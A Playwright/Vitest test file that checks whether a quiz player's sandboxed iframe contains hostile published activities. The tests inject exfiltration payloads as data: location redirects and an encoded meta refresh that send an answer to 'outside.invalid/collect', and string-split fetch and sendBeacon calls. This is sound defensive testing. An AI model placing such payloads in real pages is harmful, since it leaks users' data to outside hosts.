import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { chromium, webkit, type Browser, type Page } from "playwright";
import worker from "../src/index";
import type { StudioEnv } from "../src/env";

const origin = "https://player.test";
const slug = "ABCDEFGHIJKLMNOPQRST";
const source = '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width"><title>Quiz</title></head><body><img src="assets/image-1" alt="Diagram"><input id="answer" value="SYNTHETIC_ANSWER"><button onclick="this.textContent=\'Checked\'">Check</button></body></html>';

// The real Worker builds the response and security headers. Only its D1/R2
// collaborators are stubbed; no provider, production or external request runs.
function environment(html: string): StudioEnv {
  return {
    PUBLIC_PLAYER_ORIGIN: origin,
    DB: {
      prepare(sql: string) {
        return { bind: () => ({ first: async () => {
          if (sql.includes("FROM publications WHERE slug=")) return {
            slug, artifact_id: "artifact", revision_id: "revision", owner_hash: "owner",
            title: "Quiz", source_hash: "source", created_at: "2026-01-01T00:00:00Z",
            expires_at: "2099-01-01T00:00:00Z", revoked_at: null,
          };
          if (sql.includes("JOIN revision_assets")) return { ok: 1 };
          if (sql.includes("FROM assets WHERE id")) return {
            id: "image-1", owner_hash: "owner", object_key: "assets/image-1",
            content_type: "image/svg+xml", byte_length: 120, width: 20, height: 20,
            sha256: "image", alternative_text: "Diagram", decorative: 0,
            created_at: "2026-01-01T00:00:00Z",
          };
          throw new Error(`Unexpected test query: ${sql}`);
        } }) };
      },
    },
    MEDIA: { get: async (key: string) => {
      if (key === "sources/source.html") return { text: async () => html };
      if (key === "assets/image-1") return {
        body: '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="blue"/></svg>',
        httpEtag: "image",
        writeHttpMetadata(headers: Headers) { headers.set("content-type", "image/svg+xml"); },
      };
      return null;
    } },
  } as unknown as StudioEnv;
}

describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published activity containment (%s)", (_name, engine) => {
  let browser: Browser;
  const trace = (stage: string) => console.info(`player timing ${_name} ${performance.now().toFixed(0)}ms ${stage}`);
  beforeAll(async () => { trace("launch:start"); browser = await engine.launch(); trace("launch:done"); });
  afterAll(async () => { await browser.close(); });

  async function open(html: string, width = 1024, height = 768) {
    trace("context:start");
    const context = await browser.newContext({ viewport: { width, height } });
    trace("context:done page:start");
    const page = await context.newPage();
    trace("page:done");
    const external: string[] = [];
    const assets: string[] = [];
    const reports: unknown[] = [];
    const env = environment(html);
    await context.route("**/*", async (route) => {
      const request = route.request(), url = new URL(request.url());
      trace(`route:${url.pathname}`);
      if (url.origin !== origin) {
        external.push(url.href);
        await route.abort();
        return;
      }
      if (url.pathname === `/v1/publications/${slug}/reports`) {
        // Deliberately permissive: containment must stop activity requests even
        // if the server's independent CORS defense is accidentally relaxed.
        if (request.method() === "POST") reports.push(request.postDataJSON());
        await route.fulfill({
          status: request.method() === "OPTIONS" ? 204 : 201,
          headers: {
            "access-control-allow-origin": "*",
            "access-control-allow-methods": "POST",
            "access-control-allow-headers": "content-type",
          },
          body: request.method() === "OPTIONS" ? "" : "{}",
        });
        return;
      }
      if (url.pathname.includes("/assets/")) assets.push(url.pathname);
      const response = await worker.fetch(new Request(request.url()), env);
      const headers: Record<string, string> = {};
      response.headers.forEach((value, name) => { headers[name] = value; });
      await route.fulfill({
        status: response.status,
        headers,
        body: Buffer.from(await response.arrayBuffer()),
      });
    });
    trace("goto:start");
    await page.goto(`${origin}/${slug}`, { waitUntil: "load" });
    trace("goto:done");
    return { context, page, external, assets, reports };
  }

  function activity(page: Page) {
    const frame = page.frames().find((candidate) => candidate.url() === "about:srcdoc");
    if (!frame) throw new Error("Sandboxed activity frame not found");
    return frame;
  }

  it("rejects a missing sandboxed activity instead of testing the parent", async () => {
    const state = await open(source);
    try {
      trace("remove:start");
      await state.page.evaluate("document.querySelector('iframe').remove()");
      trace("remove:done assertion:start");
      expect(() => activity(state.page)).toThrow("Sandboxed activity frame not found");
      trace("assertion:done");
    } finally { trace("close:start"); await state.context.close(); trace("close:done"); }
  });

  it("places the scoped base in the real head, not a preceding comment", async () => {
    const state = await open(source.replace("<head>", "<!-- explain <head> here --><head>"));
    try {
      await activity(state.page).getByRole("img", { name: "Diagram" }).waitFor();
      expect(await activity(state.page).locator("head base").count()).toBe(1);
      expect(await activity(state.page).locator("head base").getAttribute("href")).toBe(`/${slug}/`);
      expect(state.assets).toEqual([`/${slug}/assets/image-1`]);
      expect(await activity(state.page).evaluate("document.querySelector('img').naturalWidth")).toBe(20);
    } finally { await state.context.close(); }
  });

  it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
    const html = payload === "encoded refresh"
      ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
      : source.replace("this.textContent='Checked'", `${payload === "top location" ? "top.location" : "location"}='https://outside.invalid/collect?answer='+answer.value`);
    const state = await open(html);
    try {
      if (payload !== "encoded refresh") await activity(state.page).getByRole("button", { name: "Check", exact: true }).click();
      await state.page.waitForTimeout(150);
      expect(state.external).toEqual([]);
      expect(state.page.url()).toBe(`${origin}/${slug}`);
      expect(await state.page.getByRole("button", { name: "Report this activity", exact: true }).count()).toBe(1);
    } finally { await state.context.close(); }
  });

  it("blocks activity fetch and beacon reports while allowing a parent report", async () => {
    const endpoint = `${origin}/v1/publications/${slug}/reports`;
    const attack = `window['fe'+'tch']('${endpoint}', {method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({reason:'unsafe'})}).catch(()=>{});navigator['send'+'Beacon']('${endpoint}',new Blob([JSON.stringify({reason:'unsafe'})],{type:'application/json'}));this.textContent='Attempted'`;
    const state = await open(source.replace("this.textContent='Checked'", attack));
    try {
      const frame = activity(state.page);
      await frame.evaluate(`(() => {
        document.body.dataset.blocked = "0";
        document.addEventListener("securitypolicyviolation", (event) => {
          if (event.effectiveDirective === "connect-src") {
            document.body.dataset.blocked = String(Number(document.body.dataset.blocked) + 1);
          }
        });
      })()`);
      await frame.getByRole("button", { name: "Check", exact: true }).click();
      expect(await frame.getByRole("button", { name: "Attempted", exact: true }).count()).toBe(1);
      await state.page.waitForTimeout(150);
      expect(state.reports).toEqual([]);
      await expect.poll(() => frame.evaluate("Number(document.body.dataset.blocked)")).toBeGreaterThanOrEqual(2);
      state.page.once("dialog", (dialog) => { void dialog.accept("accessibility"); });
      const report = state.page.getByRole("button", { name: "Report this activity", exact: true });
      await report.click();
      await expect.poll(() => report.textContent()).toBe("Report sent");
      expect(state.reports).toEqual([{ reason: "accessibility" }]);
    } finally { await state.context.close(); }
  });

  it.each([[390, 844], [1024, 768]])("keeps images, interactions and reporting usable at %sx%s", async (width, height) => {
    const state = await open(source, width, height);
    try {
      const frame = activity(state.page);
      await frame.getByRole("button", { name: "Check", exact: true }).click();
      expect(await frame.getByRole("button", { name: "Checked", exact: true }).count()).toBe(1);
      expect(await frame.evaluate("document.querySelector('img').naturalWidth")).toBe(20);
      expect(await frame.evaluate("innerWidth")).toBe(width);
      state.page.once("dialog", (dialog) => { void dialog.accept("accessibility"); });
      const report = state.page.getByRole("button", { name: "Report this activity", exact: true });
      await report.click();
      await expect.poll(() => report.textContent()).toBe("Report sent");
      expect(state.reports).toEqual([{ reason: "accessibility" }]);
      expect(state.external).toEqual([]);
    } finally { await state.context.close(); }
  });
});
